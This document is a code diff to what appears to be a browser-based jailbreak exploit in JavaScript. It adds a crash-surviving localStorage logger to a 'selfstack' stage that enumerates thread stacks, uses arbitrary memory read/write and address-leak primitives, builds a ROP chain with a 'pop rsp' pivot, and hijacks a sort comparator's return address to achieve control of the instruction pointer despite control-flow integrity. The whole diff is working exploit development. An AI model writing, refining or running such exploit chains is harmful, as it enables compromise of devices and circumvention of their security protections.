@@ -240,6 +240,42 @@ async function prepare(p) {
     // crash; the pivot is wired once the locate is confirmed on device.
     if (typeof OFFSET_wk_bootstrap !== "undefined"
         && OFFSET_wk_bootstrap === "selfstack") {
+        // Synchronous crash-proof logger: each step is committed to
+        // localStorage BEFORE the next (a queued jbmark is lost on a
+        // synchronous crash). The previous run's trail is painted on screen at
+        // the top so a crashing pivot is still diagnosable on the next boot.
+        const NL = String.fromCharCode(10);
+        function selfLog(tag, detail) {
+            const line = tag + (detail ? " " + detail : "");
+            try {
+                localStorage.setItem("slopself",
+                    (localStorage.getItem("slopself") || "") + line + NL);
+            } catch (e) {}
+            try { jbmark(tag, detail); } catch (e) {}
+        }
+        let prevTrail = "";
+        try { prevTrail = localStorage.getItem("slopself") || ""; } catch (e) {}
+        try {
+            let sink = document.getElementById("selfsink");
+            if (!sink) {
+                sink = document.createElement("pre");
+                sink.id = "selfsink";
+                sink.setAttribute("style",
+                    "position:fixed;top:0;left:0;right:0;z-index:99999;margin:0;"
+                    + "background:#000;color:#0f0;font:11px monospace;"
+                    + "white-space:pre-wrap;max-height:100vh;overflow:auto;padding:4px");
+                document.body.appendChild(sink);
+            }
+            sink.textContent = prevTrail
+                ? "=== PREVIOUS SELFSTACK TRAIL (last completed line = where it died) ===" + NL
+                    + prevTrail
+                : "=== selfstack: no previous trail (first run) ===";
+        } catch (e) {}
+        try { localStorage.removeItem("slopself"); } catch (e) {}
+        // let the browser PAINT the previous trail before we risk crashing.
+        await new Promise(r => setTimeout(r, 120));
+        selfLog("SELF-BEGIN", "fw=" + window.fw_str);
+
         // Enumerate every thread stack -- we do not assume which thread runs
         // our JS. (base, size) pairs from _thread_list.
         const stacks = [];
@@ -251,7 +287,7 @@ async function prepare(p) {
                 && sz.low <= 0x400000)
                 stacks.push([sa, sz.low]);
         }
-        jbmark("SELF-STACKS", "count=" + stacks.length + "-sizes="
+        selfLog("SELF-STACKS", "count=" + stacks.length + "-sizes="
             + stacks.map(x => "0x" + x[1].toString(16)).join(","));
 
         const M0 = 0x13370001, M1 = 0x13370002, TAG = 0xffff0000;
@@ -338,7 +374,7 @@ async function prepare(p) {
             //    comparator return would leave it.
             push(gaddr("pop rsp")); push(retSlot);
 
-            jbmark("SELF-PIVOT-ARM", "cf=0x" + cf.toString()
+            selfLog("SELF-PIVOT-ARM", "cf=0x" + cf.toString()
                 + "-retSlot=0x" + retSlot.toString()
                 + "-chainEntry=0x" + chainEntry.toString()
                 + "-origRet=0x" + origRet.toString());
@@ -348,11 +384,13 @@ async function prepare(p) {
             // baseline `ret` pops retSlot -> pop rsp -> rsp = chainEntry -> chain.
             p.write8(cbSlot, chainEntry);
             p.write8(retSlot, gaddr("pop rsp"));
+            selfLog("SELF-PIVOT-FIRED", "slots-overwritten-returning-now-"
+                + "(if trail ends here the pivot/chain/return faulted)");
             return 0;
         };
         comparatorAddr = p.leakval(comparator);
         nogc.push(comparator);
-        jbmark("SELF-COMPARATOR", "cell=0x" + comparatorAddr.toString());
+        selfLog("SELF-COMPARATOR", "cell=0x" + comparatorAddr.toString());
 
         // A big array of markers -> hundreds of comparator calls (warmup + JIT).
         const arr = [];
@@ -360,7 +398,7 @@ async function prepare(p) {
         arr.sort(comparator);
 
         const got = p.read8(scratch);
-        jbmark("SELF-PIVOT-RESULT", "armed=" + done + "-calls=" + calls
+        selfLog("SELF-PIVOT-RESULT", "armed=" + done + "-calls=" + calls
             + "-scratch=0x" + got.toString()
             + "-magicMatch=" + (got.low === MAGIC.low && got.hi === MAGIC.hi));
         if (!(got.low === MAGIC.low && got.hi === MAGIC.hi))
@@ -368,7 +406,7 @@ async function prepare(p) {
                 + "written (armed=" + done + ", calls=" + calls + "). If the page "
                 + "survived, the comparator epilogue was not a native ret off "
                 + "CF+0x08 -- warm up harder or find the native return slot.");
-        jbmark("SELF-PIVOT-OK", "RIP CONTROL on the main thread via self-stack "
+        selfLog("SELF-PIVOT-OK", "RIP CONTROL on the main thread via self-stack "
             + "return hijack -- chain ran and returned cleanly (magic=0x"
             + got.toString() + ")");
         throw new Error("selfstack PIVOT OK: CFI-immune RIP control achieved on "
